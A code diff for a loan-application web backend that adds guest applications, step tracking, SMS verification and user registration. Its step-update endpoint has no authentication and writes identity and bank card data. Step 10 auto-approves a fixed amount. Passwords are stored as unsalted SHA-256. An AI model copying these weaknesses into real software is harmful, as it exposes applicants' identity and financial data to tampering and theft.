@@ -257,22 +257,189 @@ app.get('/api/admin/users', adminAuth, async (c) => {
   }
 });
 
-// 获取申请详情
+// 获取所有申请详情（包括访客申请）
 app.get('/api/admin/applications', adminAuth, async (c) => {
   try {
     const applications = await c.env.DB.prepare(`
-      SELECT la.*, u.email, u.first_name, u.last_name,
-             COUNT(up.id) as upload_count
+      SELECT la.*, 
+             u.email, u.first_name, u.last_name,
+             COUNT(up.id) as upload_count,
+             COUNT(aps.id) as completed_steps
       FROM loan_applications la
-      JOIN users u ON la.user_id = u.id
+      LEFT JOIN users u ON la.user_id = u.id
       LEFT JOIN uploads up ON la.id = up.application_id
+      LEFT JOIN application_steps aps ON la.id = aps.application_id
       GROUP BY la.id
-      ORDER BY la.created_at DESC
+      ORDER BY la.started_at DESC
     `).all();
 
     return c.json({ applications: applications.results || [] });
   } catch (error) {
     return c.json({ error: 'Failed to fetch applications' }, 500);
+  }
+});
+
+// 获取访客申请详情
+app.get('/api/admin/applications/guests', adminAuth, async (c) => {
+  try {
+    const guestApplications = await c.env.DB.prepare(`
+      SELECT la.id, la.phone, la.session_id, la.step, la.status, 
+             la.started_at, la.created_at, la.updated_at,
+             COUNT(aps.id) as completed_steps,
+             GROUP_CONCAT(aps.step_name) as step_names
+      FROM loan_applications la
+      LEFT JOIN application_steps aps ON la.id = aps.application_id
+      WHERE la.is_guest = TRUE
+      GROUP BY la.id
+      ORDER BY la.started_at DESC
+    `).all();
+
+    return c.json({ guestApplications: guestApplications.results || [] });
+  } catch (error) {
+    return c.json({ error: 'Failed to fetch guest applications' }, 500);
+  }
+});
+
+// 获取特定申请的步骤详情
+app.get('/api/admin/applications/:id/steps', adminAuth, async (c) => {
+  try {
+    const applicationId = c.req.param('id');
+    
+    const steps = await c.env.DB.prepare(`
+      SELECT * FROM application_steps 
+      WHERE application_id = ?
+      ORDER BY step_number ASC, completed_at ASC
+    `).bind(applicationId).all();
+
+    const application = await c.env.DB.prepare(`
+      SELECT la.*, u.email, u.phone as user_phone
+      FROM loan_applications la
+      LEFT JOIN users u ON la.user_id = u.id
+      WHERE la.id = ?
+    `).bind(applicationId).first();
+
+    return c.json({ 
+      application: application || null,
+      steps: steps.results || [] 
+    });
+  } catch (error) {
+    return c.json({ error: 'Failed to fetch application steps' }, 500);
+  }
+});
+
+// ========== 申请API ==========
+
+// 创建访客申请
+app.post('/api/applications/guest', async (c) => {
+  try {
+    const sessionId = c.req.header('X-Session-ID') || crypto.randomUUID();
+    const ip = c.req.header('CF-Connecting-IP') || '';
+    const userAgent = c.req.header('User-Agent') || '';
+    
+    const applicationId = crypto.randomUUID();
+    
+    // 创建访客申请记录
+    await c.env.DB.prepare(`
+      INSERT INTO loan_applications (id, session_id, step, is_guest, started_at, created_at)
+      VALUES (?, ?, 1, TRUE, ?, ?)
+    `).bind(applicationId, sessionId, Math.floor(Date.now() / 1000), Math.floor(Date.now() / 1000)).run();
+    
+    // 记录初始步骤
+    await c.env.DB.prepare(`
+      INSERT INTO application_steps (id, application_id, step_number, step_name, ip_address, user_agent)
+      VALUES (?, ?, 1, 'application_started', ?, ?)
+    `).bind(crypto.randomUUID(), applicationId, ip, userAgent).run();
+    
+    return c.json({ 
+      success: true, 
+      applicationId,
+      sessionId,
+      message: 'Guest application created'
+    });
+  } catch (error) {
+    return c.json({ error: 'Failed to create guest application' }, 500);
+  }
+});
+
+// 更新申请步骤（支持访客和用户）
+app.put('/api/applications/:id/step', async (c) => {
+  try {
+    const applicationId = c.req.param('id');
+    const { step, data, phone } = await c.req.json();
+    const ip = c.req.header('CF-Connecting-IP') || '';
+    const userAgent = c.req.header('User-Agent') || '';
+    
+    // 更新申请步骤
+    let updateQuery = 'UPDATE loan_applications SET step = ?, updated_at = ? ';
+    let params = [step, Math.floor(Date.now() / 1000)];
+    
+    // 如果有手机号，先记录（在验证之前）
+    if (phone && step === 1) {
+      updateQuery += ', phone = ? ';
+      params.push(phone);
+    }
+    
+    // 根据步骤添加相应的字段更新
+    if (step === 2 && data?.idNumber && data?.realName) {
+      updateQuery += ', id_number = ?, real_name = ? ';
+      params.push(data.idNumber, data.realName);
+    } else if (step === 4 && data?.contact1Name) {
+      updateQuery += ', contact1_name = ?, contact1_phone = ?, contact2_name = ?, contact2_phone = ? ';
+      params.push(data.contact1Name, data.contact1Phone, data.contact2Name, data.contact2Phone);
+    } else if (step === 7 && data?.bankCardNumber) {
+      updateQuery += ', bank_card_number = ? ';
+      params.push(data.bankCardNumber);
+    } else if (step === 8) {
+      updateQuery += ', status = ?, submitted_at = ? ';
+      params.push('submitted', Math.floor(Date.now() / 1000));
+    } else if (step === 10) {
+      updateQuery += ', status = ?, approved_at = ?, approval_amount = ? ';
+      params.push('approved', Math.floor(Date.now() / 1000), 50000);
+    } else if (step === 11 && data?.withdrawalAmount) {
+      updateQuery += ', withdrawal_amount = ?, installment_period = ? ';
+      params.push(data.withdrawalAmount, data.installmentPeriod);
+    } else if (step === 12) {
+      updateQuery += ', status = ? ';
+      params.push('withdrawn');
+    }
+    
+    updateQuery += ' WHERE id = ?';
+    params.push(applicationId);
+    
+    await c.env.DB.prepare(updateQuery).bind(...params).run();
+    
+    // 记录步骤完成
+    const stepNames = {
+      1: 'phone_verification',
+      2: 'identity_info',
+      3: 'id_upload',
+      4: 'contacts_info',
+      5: 'liveness_detection',
+      6: 'credit_authorization',
+      7: 'bank_card',
+      8: 'application_submit',
+      9: 'processing',
+      10: 'approved',
+      11: 'withdrawal',
+      12: 'completed'
+    };
+    
+    await c.env.DB.prepare(`
+      INSERT INTO application_steps (id, application_id, step_number, step_name, step_data, ip_address, user_agent)
+      VALUES (?, ?, ?, ?, ?, ?, ?)
+    `).bind(
+      crypto.randomUUID(), 
+      applicationId, 
+      step, 
+      stepNames[step as keyof typeof stepNames] || `step_${step}`,
+      JSON.stringify(data || {}),
+      ip,
+      userAgent
+    ).run();
+    
+    return c.json({ success: true, message: 'Step updated successfully' });
+  } catch (error) {
+    return c.json({ error: 'Failed to update step' }, 500);
   }
 });
 
@@ -403,7 +570,7 @@ app.post('/api/auth/send-sms', async (c) => {
 // 验证短信验证码
 app.post('/api/auth/verify-sms', async (c) => {
   try {
-    const { phone, code } = await c.req.json();
+    const { phone, code, applicationId } = await c.req.json();
     
     // 查询验证码
     const verification = await c.env.DB.prepare(`
@@ -421,12 +588,47 @@ app.post('/api/auth/verify-sms', async (c) => {
       UPDATE sms_verifications SET verified = TRUE WHERE id = ?
     `).bind(verification.id).run();
     
-    // 创建或更新用户
-    const userId = crypto.randomUUID();
-    await c.env.DB.prepare(`
-      INSERT OR REPLACE INTO users (id, phone, phone_verified, status)
-      VALUES (?, ?, TRUE, 'active')
-    `).bind(userId, phone).run();
+    // 检查用户是否已存在
+    let user = await c.env.DB.prepare(`
+      SELECT * FROM users WHERE phone = ?
+    `).bind(phone).first();
+    
+    let userId;
+    if (!user) {
+      // 自动注册新用户
+      userId = crypto.randomUUID();
+      await c.env.DB.prepare(`
+        INSERT INTO users (id, phone, phone_verified, status, created_at)
+        VALUES (?, ?, TRUE, 'active', ?)
+      `).bind(userId, phone, Math.floor(Date.now() / 1000)).run();
+      
+      // 记录用户活动
+      await c.env.DB.prepare(`
+        INSERT INTO user_activities (id, user_id, activity_type, activity_data)
+        VALUES (?, ?, 'auto_register', ?)
+      `).bind(crypto.randomUUID(), userId, JSON.stringify({ phone, source: 'loan_application' })).run();
+    } else {
+      userId = user.id;
+      // 更新手机验证状态
+      await c.env.DB.prepare(`
+        UPDATE users SET phone_verified = TRUE WHERE id = ?
+      `).bind(userId).run();
+    }
+    
+    // 如果有关联的申请，将访客申请转换为用户申请
+    if (applicationId) {
+      await c.env.DB.prepare(`
+        UPDATE loan_applications 
+        SET user_id = ?, phone = ?, is_guest = FALSE, updated_at = ?
+        WHERE id = ?
+      `).bind(userId, phone, Math.floor(Date.now() / 1000), applicationId).run();
+      
+      // 记录步骤完成
+      await c.env.DB.prepare(`
+        INSERT INTO application_steps (id, application_id, step_number, step_name, step_data, ip_address)
+        VALUES (?, ?, 1, 'phone_verification', ?, ?)
+      `).bind(crypto.randomUUID(), applicationId, JSON.stringify({ phone, verified: true }), c.req.header('CF-Connecting-IP') || '').run();
+    }
     
     // 创建会话
     const token = crypto.randomUUID();
@@ -440,10 +642,94 @@ app.post('/api/auth/verify-sms', async (c) => {
     return c.json({ 
       success: true, 
       token,
-      user: { id: userId, phone, phone_verified: true }
+      user: { id: userId, phone, phone_verified: true },
+      applicationId: applicationId || null
     });
   } catch (error) {
     return c.json({ error: 'Failed to verify SMS' }, 500);
+  }
+});
+
+// 用户注册
+app.post('/api/auth/register', async (c) => {
+  try {
+    const { phone, password, code, applicationId } = await c.req.json();
+    
+    // 查询验证码
+    const verification = await c.env.DB.prepare(`
+      SELECT * FROM sms_verifications 
+      WHERE phone = ? AND code = ? AND verified = FALSE AND expires_at > ?
+      ORDER BY created_at DESC LIMIT 1
+    `).bind(phone, code, Math.floor(Date.now() / 1000)).first();
+    
+    if (!verification) {
+      return c.json({ error: 'Invalid or expired code' }, 400);
+    }
+    
+    // 标记为已验证
+    await c.env.DB.prepare(`
+      UPDATE sms_verifications SET verified = TRUE WHERE id = ?
+    `).bind(verification.id).run();
+    
+    // 检查用户是否已存在
+    let user = await c.env.DB.prepare(`
+      SELECT * FROM users WHERE phone = ?
+    `).bind(phone).first();
+    
+    let userId;
+    if (user) {
+      return c.json({ error: 'Phone number already registered' }, 400);
+    }
+    
+    // 创建新用户
+    userId = crypto.randomUUID();
+    // 简单的密码哈希（生产环境应使用更安全的方法）
+    const hashedPassword = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(password));
+    const hashedPasswordHex = Array.from(new Uint8Array(hashedPassword)).map(b => b.toString(16).padStart(2, '0')).join('');
+    
+    await c.env.DB.prepare(`
+      INSERT INTO users (id, phone, hashed_pass, phone_verified, status, created_at)
+      VALUES (?, ?, ?, TRUE, 'active', ?)
+    `).bind(userId, phone, hashedPasswordHex, Math.floor(Date.now() / 1000)).run();
+    
+    // 记录用户活动
+    await c.env.DB.prepare(`
+      INSERT INTO user_activities (id, user_id, activity_type, activity_data)
+      VALUES (?, ?, 'register', ?)
+    `).bind(crypto.randomUUID(), userId, JSON.stringify({ phone, source: 'loan_application' })).run();
+    
+    // 如果有关联的申请，将访客申请转换为用户申请
+    if (applicationId) {
+      await c.env.DB.prepare(`
+        UPDATE loan_applications 
+        SET user_id = ?, phone = ?, is_guest = FALSE, updated_at = ?
+        WHERE id = ?
+      `).bind(userId, phone, Math.floor(Date.now() / 1000), applicationId).run();
+      
+      // 记录步骤完成
+      await c.env.DB.prepare(`
+        INSERT INTO application_steps (id, application_id, step_number, step_name, step_data, ip_address)
+        VALUES (?, ?, 1, 'user_registration', ?, ?)
+      `).bind(crypto.randomUUID(), applicationId, JSON.stringify({ phone, registered: true }), c.req.header('CF-Connecting-IP') || '').run();
+    }
+    
+    // 创建会话
+    const token = crypto.randomUUID();
+    const expiresAt = Math.floor(Date.now() / 1000) + 7 * 24 * 60 * 60; // 7天
+    
+    await c.env.DB.prepare(`
+      INSERT INTO user_sessions (id, user_id, token, expires_at)
+      VALUES (?, ?, ?, ?)
+    `).bind(crypto.randomUUID(), userId, token, expiresAt).run();
+    
+    return c.json({ 
+      success: true, 
+      token,
+      user: { id: userId, phone, phone_verified: true },
+      applicationId: applicationId || null
+    });
+  } catch (error) {
+    return c.json({ error: 'Failed to register' }, 500);
   }
 });
 
